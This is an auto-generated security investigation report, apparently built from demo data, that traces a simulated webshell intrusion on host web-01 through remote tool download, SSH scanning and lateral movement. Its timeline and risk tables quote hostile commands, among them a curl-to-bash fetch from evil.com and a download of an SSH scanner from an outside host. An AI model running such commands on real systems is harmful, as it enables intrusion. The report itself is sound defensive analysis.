# SecWeaver Investigation Bundle Report

This report is auto-generated from offline demo JSON outputs: completeness precheck, alert confirmation, traceability analysis, and risk identification.

---

## 1. Data source completeness

# Data Source Completeness Report

- **Scenario**: S1
- **Scenario summary**: 外网攻击 IP 溯源
- **Overall verdict**: full_traceable
- **Confidence**: 1.0
- **Can trace**: True
- **Can confirm breach**: True
- **Recommended next skill**: traceability_analysis

数据源满足当前调查场景，可启动下游溯源或确认 Skill。

## Investigation parameters

- **Attacker IP**: 203.0.113.10
- **Time range**: 2026-06-21T08:00:00+08:00 ~ 2026-06-21T20:00:00+08:00
- **Hosts**: web-01

## Requirement evaluation

| Priority | Requirement | Status | Asset |
| --- | --- | --- | --- |
| P0 | WEB/WAF 日志 | ready | `asset-waf-prod-01` |
| P0 | WEB 服务器进程命令执行 | ready | `asset-secweaver-host-exec` |
| P0 | SSH 认证日志 | ready | `asset-ssh-internal` |
| P1 | WEB 服务器主动外连 | ready | `asset-secweaver-host-connect` |
| P1 | 防火墙/全流量内网连接 | ready | `asset-fw-dmz-internal` |
| P1 | DNS 查询日志 | ready | `asset-dns-internal` |
| P2 | WEB 服务器文件操作 | ready | `asset-secweaver-host-file-op` |
| P2 | 资产清单 | ready | `asset-cmdb-hosts` |

---

## 2. Alert confirmation

# Alert Confirmation Report

- **Alert ID**: WAF-20260621-002
- **Scenario**: S4
- **Alert verdict**: confirmed_attack
- **Attack type**: WebShell
- **Attack outcome**: success_confirmed
- **Attack success**: True
- **Confidence**: 0.88
- **WAF action**: logged
- **Recommended action**: 升级调查，建议隔离受害主机
- **Next skill**: traceability_analysis

真实攻击（WebShell）；检测到 webshell 攻击特征: shell.php, cmd=；攻击已成功；WAF 动作: logged。

## Payload analysis

- **Has payload**: True
- **Payload snippet**: cmd=whoami
- **Technique**: webshell
- **Validity**: valid
- **Notes**: 检测到 webshell 攻击特征: shell.php, cmd=

## Evidence summary

- **alert**: WAF-20260621-002
- **supporting**: exec-101, connect-101, file-101, web-101
- **success_proof**: exec-101, connect-101, file-101
- **false_positive_indicators**: _(none)_

## Join edges

| Join ID | Left evidence | Right evidence | Match keys | Confidence |
| --- | --- | --- | --- | --- |
| d2_exec_connect_same_listener | exec-101 | connect-101 | host=web-01, listener_port=443 | 0.9 |
| d2_exec_file_same_host | exec-101 | file-101 | host=web-01 | 0.85 |

## Next step

已确认真实攻击且成功，建议启动溯源分析

---

## 3. Attack chain traceability

# Attack Chain Traceability Report

- **Scenario**: S1, S2, S3
- **Overall verdict**: confirmed_intrusion_chain
- **Confidence**: 0.88
- **Blocked**: False

攻击者 203.0.113.55 于 2026-06-22T09:07:55 命中 web-01；在 web-01 上发现 4 条执行/下载行为；横向至 db-01, app-02。

## Initial access

- **Victim host**: web-01
- **Time**: 2026-06-22T09:07:55+08:00
- **Vector**: webshell
- **URL**: /api/upload.php
- **Attacker IP**: 203.0.113.55
- **Evidence**: web-001

## Attack timeline

| Time | Stage | Host | Description | Evidence |
| --- | --- | --- | --- | --- |
| 2026-06-22T09:07:55+08:00 | initial_access | web-01 | 外网 203.0.113.55 访问 /api/upload.php（webshell） | web-001 |
| 2026-06-22T09:10:15+08:00 | execution | web-01 | 主机 web-01 执行命令: sh -c whoami | exec-001, file-001, file-002 |
| 2026-06-22T09:12:32+08:00 | execution | web-01 | web-01 监听进程子进程下载/执行: curl -o /tmp/sshscan http://198.51.100.5/tools/sshscan | exec-002, connect-001, file-001, file-002 |
| 2026-06-22T09:13:05+08:00 | execution | web-01 | 主机 web-01 执行命令: chmod +x /tmp/sshscan；主动外连 198.51.100.5:80 | exec-003, connect-001, file-001, file-002 |
| 2026-06-22T09:14:20+08:00 | execution | web-01 | 主机 web-01 执行命令: /tmp/sshscan -t 10.0.2.0/24 -p 22；主动外连 198.51.100.5:80 | exec-004, connect-001, file-001, file-002 |
| 2026-06-22T09:19:15+08:00 | lateral_movement | db-01 | SSH 登录成功: web-01(10.0.1.5) → db-01 用户 root | ssh-002, fw-001 |
| 2026-06-22T09:22:40+08:00 | lateral_movement | app-02 | SSH 登录成功: web-01(10.0.1.5) → app-02 用户 deploy | ssh-003, fw-002 |

## Impact scope

| Host | Role | Priority |
| --- | --- | --- |
| web-01 | initial_compromise | P0 |
| db-01 | lateral_target | P0 |
| app-02 | lateral_target | P0 |

## Recommended actions

- 立即隔离初始受害主机: web-01
- 排查并隔离横向目标（至少）: db-01, app-02
- 保全 WEB 与 SSH 相关日志，冻结当前时间窗证据
- 重置横向涉及主机上的可疑账号密码，检查 SSH 密钥

---

## 4. Host risk identification

# Risk Identification Report

- **Scenario**: S5
- **Overall verdict**: high_risk_detected
- **Coverage level**: partial
- **Events scanned**: 2
- **Risk items**: 2
- **P0**: 2

## Data source reminders

- 【建议】缺少 进程文件操作，exec 规则的上下文加权（同窗 file 事件）不可用，WebShell 落地若未体现在 command 中将漏检


## Data gaps

- host_file_op: missing — exec context boost degraded

## Attack chains

- `chain-web-01-1` web-01 P0 conf=0.95


## Top risks

| Severity | Module | Host | Summary |
| --- | --- | --- | --- |
| P0 | exec | web-01 | web-01 443/nginx 子进程下载并执行远程内容: /bin/sh -c curl http://evil.com/a.sh | bash |
| P0 | connect | web-01 | web-01 监听端口 443 进程主动外连公网 203.0.113.99:443 (P0) |

## Recommended next skills

- `traceability-analysis`: 存在 P0 风险，建议溯源攻击链与横向范围

---
